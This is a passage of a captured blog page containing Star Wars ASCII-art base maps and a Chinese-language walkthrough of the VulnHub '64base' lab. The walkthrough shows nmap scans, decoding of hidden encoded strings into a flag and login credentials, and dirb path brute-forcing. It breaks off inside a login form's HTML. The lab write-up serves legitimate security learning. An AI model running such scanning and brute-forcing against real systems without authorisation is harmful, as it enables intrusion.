_/___\\_ | |XXX\\ \\             7 ....... AT-AT Walker    --===____/--===X|_|/_______\\|_|X===--\\____===--   8 ........ AT-ST Scout     /__| |     /l_\\\\             //_|\\     |_|__\\    /~~.&#x27; |    /:&#x27;  \\\\   _____   //  `:\\    | `.  \\   /   | .&#x27;   / |    \\\\==|||||==//    | \\   `. |   \\   7    8  /   .&#x27; |   / .&#x27;     |  ||5|| 6|     `. \\   | `.   \\  xx=   _ /____|__|__/__|______l__|||||__l______|__\\__|__|____\\ ll   &lt;~____________________________________________________________________________%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                 O u t e r   D e f e n s e s            |                      |             ---------------------------         ^_[]_^                 ^_[]_^         |----|               5 |----|        1 ... High Voltage Death Fence ________`-..-&#x27;________4________`-..-&#x27;______  2 ....... Perimeter Gate House ===========================================  3 ........ Powered Force Field          `||&#x27;                   `||&#x27;         4 .......... Fortified Catwalk           ||     ^==^   ^==^     ||          5 ......... Observattion tower ___.____._ll_._1_|--|   |--|___._ll_.____.____ XXX|XXXX|XIIX|XXX|--| 3 |--|XXX|XIIX|XXXX|XXXX XXX|XXXX|XIIX|XXX| 2|   |  |XXX|XIIX|XXXX|XXXX The outer perimeter is  marked  by a  high-voltage  &quot;death fence.&quot;  Powered Force fields  placed at regular intervals along the fence may be turned off to permit entry and exit.  Observation towers,  connected by fortified cat- walks,  are set back from the fence and constantly manned by stormtroopers. Other outer  defenses  include energy mine fields,  modified patrol Droids, and AT-ST Scout Walkers.____________________________________________________________________________%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~             _            /|                               L a n d i n g   P l a t f o r m          -==+                               -------------------------------            :         [__________]               Up to two Lambda-class shuttles and four         `&#x27; ||  ||`-&#x27;               AT-AT  Walkers can dock at the platform.           ========  =xx            A loading  ramp  leads directly from the            ||  ||    ll            platform into the garrison complex.     ~~~~~~~~~~~~~~~~~~~~~~____________________________________________________________________________%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                     I n t e r i o r ,   L e v e l s   1 - 5                                     ---------------------------------------          ______         ______      The first 5 levels of the garrison com-         / ____ \\_______/ ____ \\     plex are of identical layout, construc-        / /    \\_________/    \\ \\    ted  around  a  level-spanning  surface       / /      |   3   |  5   \\ \\   vehicle bay.  Refer to the key below to       \\ \\       \\_____/_______/ /   determine what each level contains.       / /    o   |o o|   o    \\ \\    __/ /  2    .&#x27; o4o `.    6  \\ \\__    1 ... Storage Gallery (levels 1-2),   / __/      .&#x27; ._o_o_. `.      \\__ \\         Armory (levels 3-4), Training  / /  `-.  .&#x27; .&#x27;  10   `. `.  .-&#x27;  \\ \\        Facilities   and   Recreation / /      ~&#x27; .&#x27;`-._____.-&#x27;`. `~      \\ \\       Rooms (level 5) \\ \\     o  &lt;  C  | | |  D  &gt;  o  7  / / 2 ... Stormtrooper Barracks (levels  \\ \\__      \\    &#x27; &#x27; &#x27;    /      __/ /        1-3),    Security    Barracks   \\__ \\  1  |----  9  ----|~-._ / __/         (levels 4-5)      \\ \\    |====    B====|    Y /      3 ...... Base Security (levels 1-5)       \\ \\   |----     ----|   / /       4 ......... Turbolifts (levels 1-6)       / /   |__A_     _ __| 8 \\ \\       5 .... Detention Block (levels 1-5)       \\ \\      | |   | |      / /       6 ... Technical and Service Person-        \\ \\_____| |   | |_____/ /              nel Barracks (levels 1-5)         \\_____ `o|   |o&#x27; _____/         7 ... Technical Shops (levels 1-2),               `--&#x27;   `--&#x27;                     Medical   Bay    (level   3),                                               Science Labs (levels 4-5)                8 ... Storage Gallery (levels 1-2), Droid Shops (levels 3-5)                9 ...................... Surface Vehicle  Bay  (levels 1-5):                A .................................. AT-ST Scout Walker Bays                B ........................................ AT-AT Walker Bays                C ...................... Vehicle Maintenance and Repair Deck                D ........................................ Speeder Bike Deck                10 ........................... Miscellaneous Vehicle Parking____________________________________________________________________________%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                           I n t e r i o r ,   L e v e l   6                                           ---------------------------------         ____           ____        / __ \\_________/ __ \\        Base command personnel,  control rooms,       / /  \\___________/  \\ \\       rooms,  trade  mission,  and diplomatic       \\ \\ o     oo      o / /       offices are located on this level.       / /       oo----.   \\ \\      / /   8  __oo     `.1 \\ \\      1 ....... Sensor Monitors, Tractor Beam   __/ /\\    .~  ||   2   \\  \\ \\__                       and Shield Controls  / __/  \\ .&#x27; 9.-&#x27;`-.      | /\\__ \\  2 ....................... Computer Room / /   o  \\|__:   o  :_____|/ o  \\ \\ 3 ....................... Meeting Rooms \\ \\__  7 .---: 10   :------.3 __/ / 4 ...... Officers&#x27; and Pilots&#x27; Quarters  \\__ \\  /     `-..-&#x27;        \\/ __/  5 ... Trade Mission, Diplomatic Offices     \\ \\/\\   5   ||          / /     6 ........... Base Commander&#x27;s Quarters      \\ \\ `.     ||    4    / /                                  and offices       \\ \\ o~`---||      o / /       7 ............ Officer Recreation Rooms       / /6  ____||_____   \\ \\       8 ............................. Offices       \\ \\__/ _________ \\__/ /       9 ................... Base Control Room        \\____/         \\____/        10 ..................... Reception Area____________________________________________________________________________%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                           I n t e r i o r ,   L e v e l   7                                           ---------------------------------        __             __       /_]\\           /[_\\        The TIE Fighter  Hanger  Deck  houses  the       \\ \\,===========./ /        garrison&#x27;s TIE fighters in standard-design       //:o-----------o:\\\\        ceiling racks.  Bases are usually equipped      /// X  X X X X  X \\\\\\       with  30 TIE fighters and five TIE bombers     /// X X  X_X_X  X X \\\\\\      (a single  bomber  takes  up the same rack  __/// X X   [___]   X X \\\\\\__   space as two fighters).  Five  to 15 ships /\\_/o X X  1 &amp;/3\\&amp;    X X o\\_/\\  are on constant  patrol,  depending on the \\]_\\\\ X X   &lt;\\\\_//&gt;       //_[/  base&#x27;s readiness level.    \\\\\\ X X   \\&gt;&amp;&lt;/2  X []///     \\\\\\ X X   []    X []///      1 .............. TIE Fighter Ceiling Racks      \\\\\\ X   [] []     ///                           (holds up to 40 craft)       \\\\:o-----------o://        2 ............. Lift Platforms, to Level 8       /_/`===========&#x27;\\_\\        3 .................. Flight Control Center       \\_]/           \\[_/        X ............................ TIE Fighter                                  [] ............................ TIE Bomber____________________________________________________________________________%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                           I n t e r i o r ,   L e v e l   8                                           ---------------------------------                                                      (not shown)  The Flight Deck contains the  tractor beam  generators which catapult out-  going craft into the open sky and reel in landing ships. Pilots relinquish  control of  their ships during take off and landing because of the limited  maneuvering area within the chutes.____________________________________________________________________________%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                               S u b - L e v e l   I n s t a l l a t i o n s                               ---------------------------------------------                                                (not shown)  A large underground section of the base  houses the main power and back-up  generators, the tractor beam and deflector shield generators, the environ-  ment  control  station,  and  the  waste  disposal and refuse units.  Some  storage facilities are also located here.____________________________________________________________________________%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Version 1.9 (released 941211). Pictures by Lennert Stock  (LS),  Rowan Crawford (-Row),  Ray Brunner,  Bob VanderClay and Joe Rumsey.  The pictures work best when shown on a white on black screen  (except for some faces)  with a not too fancy font. Contribu- tions welcome, email to the adress below. Sources LS: The Star Wars Source- book,  Star Wars Imperial Sourcebook,  The Star Wars Rebel Alliance Source- book, Star Wars: The Roleplaying Game (2nd Ed) all by West End Games, Inc.____________________________________________________________________________  ______  ______  ______  ______  ______  ______  ______  ______   |______||______||______||______||______||______||______||______||______|  _   _   ____ __          __ __     __ ____   _    _  _  _____   ______   | \\ | | / __ \\\\ \\        / / \\ \\   / // __ \\ | |  | |( )|  __ \\ |  ____| |  \\| || |  | |\\ \\  /\\  / /   \\ \\_/ /| |  | || |  | ||/ | |__) || |__ | . ` || |  | | \\ \\/  \\/ /     \\   / | |  | || |  | |   |  _  / |  __| | |\\  || |__| |  \\  /\\  /       | |  | |__| || |__| |   | | \\ \\ | |____   |_| \\_| \\____/    \\/  \\/        |_|   \\____/  \\____/    |_|  \\_\\|______|                                _  ______  _____  _____  _             /\\                | ||  ____||  __ \\|_   _|| |            /  \\               | || |__   | |  | | | |  | |           / /\\ \\          _   | ||  __|  | |  | | | |  | |          / ____ \\        | |__| || |____ | |__| |_| |_ |_|         /_/    \\_\\        \\____/ |______||_____/|_____|(_)  ______  ______  ______  ______  ______  ______  ______  ______  ______   |______||______||______||______||______||______||______||______||______|                    I hope you enjoyed this challenge                    Please leave comments &amp; feedback                    @ https://www.vulnhub.com/?q=64base                    -----------------------------------                    64Base Challenge by 3mrgnc3                    @ https://3mrgnc3.ninja                    -----------------------------------\n","dateCreated":"2018-05-12T22:56:13+00:00","dateModified":"2025-01-17T13:11:17+00:00","datePublished":"2018-05-12T22:56:13+00:00","description":"Official website: 64Base: 1.0.1 ~ VulnHub","headline":"VulnHub #64base","image":["cover.png"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-64base/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-64base/","keywords":"Writeups","thumbnailUrl":"cover.png"}</script>
+    
+    <meta name="description" content="Official website: 64Base: 1.0.1 ~ VulnHub">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="VulnHub #64base">
+<meta property="og:url" content="https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-64base/index.html">
+<meta property="og:site_name" content="&lt;Theo&#x2F;&gt;">
+<meta property="og:description" content="Official website: 64Base: 1.0.1 ~ VulnHub">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-64base/cover.png">
+<meta property="article:published_time" content="2018-05-12T22:56:13.000Z">
+<meta property="article:modified_time" content="2025-01-17T13:11:17.172Z">
+<meta property="article:author" content="Theo Chen">
+<meta property="article:tag" content="Writeups">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-64base/cover.png">
+<meta name="twitter:creator" content="@The0_Klein">
+    
+    
+        
+    
+    
+    
+        <meta property="og:image" content="https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-64base/cover.png"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-64base/cover.png"/>
+    
+    
+    
+    <!--STYLES-->
+    
+<link rel="stylesheet" href="/assets/css/style-gdcyhoyuzwa8smbm8vz2yfxz7vo2renh92pv061urgkby5doa9lemz924ywr.min.css">
+
+    <!--STYLES END-->
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106120242-2"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-106120242-2');
+    </script>
+
+
+    
+
+    
+        
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+    
+
+<header id="header" data-behavior="2">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/"
+            aria-label=""
+        >
+            &lt;Theo/&gt;
+        </a>
+    </div>
+    
+        
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="Open the link: /#about"
+            >
+        
+        
+            <img class="header-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=90" alt="Author&#39;s picture"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+    
+
+<nav id="sidebar" data-behavior="2">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a
+                    href="/#about"
+                    aria-label="Read more about the author"
+                >
+                    <img class="sidebar-profile-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=110" alt="Author&#39;s picture"/>
+                </a>
+                <h4 class="sidebar-profile-name">Theo Chen</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="Home"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="Categories"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="Tags"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="Archives"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="About"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">About</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/TheoKlein"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/The0_Klein"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://www.linkedin.com/in/theo-chen/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="LinkedIn"
+                        >
+                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">LinkedIn</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="mailto:theokleintw@gmail.com"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Mail"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Mail</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/rss2.xml"
+                            
+                            rel="noopener"
+                            title="RSS"
+                        >
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="2"
+                 class="
+                        hasCoverMetaOut
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            VulnHub #64base
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2018-05-12T22:56:13+00:00">
+	
+		    May 12, 2018
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/Writeups/">Writeups</a>, <a class="category-link" href="/categories/Writeups/VulnHub/">VulnHub</a>
+
+
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p>Official website: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/64base-101,173/">64Base: 1.0.1 ~ VulnHub</a></p>
+<span id="more"></span>
+
+<p>(I use bridged network because I run the victim VM on different host in my local network.)</p>
+<h2 id="掃描-IP-位址"><a href="#掃描-IP-位址" class="headerlink" title="掃描 IP 位址"></a>掃描 IP 位址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sP 192.168.31.1/24</span><br><span class="line">...</span><br><span class="line">Nmap scan report for 192.168.31.175</span><br><span class="line">Host is up (0.00039s latency).</span><br><span class="line">MAC Address: 08:00:27:68:E7:F8 (Oracle VirtualBox virtual NIC)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ nmap -p- -sS 192.168.31.175</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-10 13:14 UTC</span><br><span class="line">Nmap scan report for 192.168.31.175</span><br><span class="line">Host is up (0.025s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">4899/tcp  open  radmin</span><br><span class="line">62964/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.62 seconds</span><br></pre></td></tr></table></figure>
+
+<p>80 port 有開 http，決定先從網站開始著手 PT。<br><img src="/%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8A%E5%8D%8812.22.41.png"></p>
+<h2 id="大標題"><a href="#大標題" class="headerlink" title="大標題"></a>大標題</h2><p><code>dmlldyBzb3VyY2UgO0QK</code> 很有趣，雖然它並沒有 <code>base64</code> 編碼最醒目的 <code>==</code> 結尾，但大標題就寫著 64base 了還是先嘗試看看，而且 <code>==</code> 也不是 <code>base64</code> 一定會有的特徵，只是用來彌補編碼字串長度不足的添加字元。</p>
+<p>解碼以後得到了作者貼心的提示：<code>view source ;D</code></p>
+<p>在原始碼裡可以看到這一段，也就是大標題那段的原始碼：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;site-heading&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>64base<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">hr</span> <span class="attr">class</span>=<span class="string">&quot;small&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;subheading&quot;</span>&gt;</span>dmlldyBzb3VyY2UgO0QK<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到一串非常長的編碼，稍微看一下便可以斷言絕對不是 <code>base64</code> 編碼，原因很間單，因為整個字串的組成只有數字跟英文字母 <code>a</code> ～ <code>e</code>。身為一個<del>碼農</del>，看到這個格式第一個就冒出了十六進位編碼的想法（雖然字串裡並沒有出現 <code>f</code>），直接 hex to ASCII，得到一個新的字串：<code>ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg==</code>，這個 <code>base64</code> 太明顯了，解碼以後成功找到第一個 flag：<code>flag1&#123;NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg==&#125;</code>。</p>
+<p>這個 flag 內容本身也是一個 <code>base64</code> 編碼的字串，解開來是 <code>64base:Th353@r3N0TdaDr01DzU@reL00K1ing4</code>，目前還看不出什麼意義，猜想可能是帳號密碼之類的。</p>
+<h2 id="掃描網站"><a href="#掃描網站" class="headerlink" title="掃描網站"></a>掃描網站</h2><p>除了首頁的大標題有明顯的提示以外，其他頁面稍微看了看沒有看到其他明顯的提示，於是開始做一些例行的自動化檢測網站動作，先掃描一下網頁路徑，網站有 <code>robots.txt</code>。</p>
+<p><img src="/%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8B%E5%8D%886.07.54.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://192.168.31.175/robots.txt</span><br><span class="line">$ sed &#x27;1d&#x27; robots.txt | awk &#x27;&#123;print $2&#125;&#x27; &gt; list.txt</span><br><span class="line">$ dirb http://192.168.31.175 list.txt -S -r</span><br></pre></td></tr></table></figure>
+
+<p>除了其他路徑都是空白的資料夾以外，找到 <code>http://192.168.31.175/admin</code> 是一個 <code>HTML WWW-Authenticate</code> 的登入頁面，嘗試剛剛從 flag1 拿到的帳號密碼仍然無法登入，看來踏進了一個死胡同。在思考如何繞過 <code>WWW-Authenticate</code> 的同時，覺得單純透過 <code>robots.txt</code> 來爆破網頁路徑應該會有所疏漏，決定擷取網站所有的單詞來猜測&#x2F;爆破可能的路徑。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://192.168.31.175 -rq -O 64base</span><br><span class="line">$ html2dic 64base | sort -u &gt; list.txt</span><br><span class="line">$ dirb http://192.168.31.175 list -S -r</span><br><span class="line">...</span><br><span class="line">+ http://192.168.31.175/Imperial-Class (CODE:401|SIZE:461)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>發現了一個新的路徑：<code>http://192.168.31.175/Imperial-Clas</code>，同樣也是一個 <code>HTML WWW-Authenticate</code> 的登入頁面，再次嘗試 flag1 的帳號密碼，成功登入來到了新畫面。</p>
+<p><img src="/%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8B%E5%8D%886.31.54.png"></p>
+<p>在這邊又卡了死胡同很久，直到仔細看了網站的唯一篇文章，在文章最後發現了細節：<br><img src="/%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8B%E5%8D%888.07.21.png"></p>
+<p>真實的路徑應該要更改成這樣：<code>http://192.168.31.175/Imperial-Class/BountyHunter</code>，覺得這個關卡真的太通靈了…<br><img src="/%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8B%E5%8D%888.11.52.png"><br>再拿 flag1 得到的帳號密碼是一次無法登入，檢視原始碼的時候發現有奇特的編碼字串：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">#000000</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">#cfbf00</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;login-form&quot;</span> <span class="attr">id</span>=<span class="string">&quot;login-form&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;./login.php&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">legend</span>&gt;</span>Please login:<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">title</span>=<span class="string">&quot;Username&quot;</span>&gt;</span>Username:</span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">tabindex</span>=<span class="string">&quot;1&quot;</span> <span class="attr">accesskey</span>=<span class="string">&quot;u&quot;</span> <span class="attr">name</span>=<span class="string">&quot;function&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;50&quot;</span> <span class="attr">id</span>=<span class="string">&quot;5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">title</span>=<span class="string">&quot;Password&quot;</span>&gt;</span>Password:</span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">tabindex</span>=<span class="string">&quot;2&quot;</span> <span class="attr">accesskey</span>=<span class="string">&quot;p&quot;</span> <span class="attr">name</span>=<span class="string">&quot;command&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;15&quot;</span> <span class="attr">id</span>=<span class="string">&quot;584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span 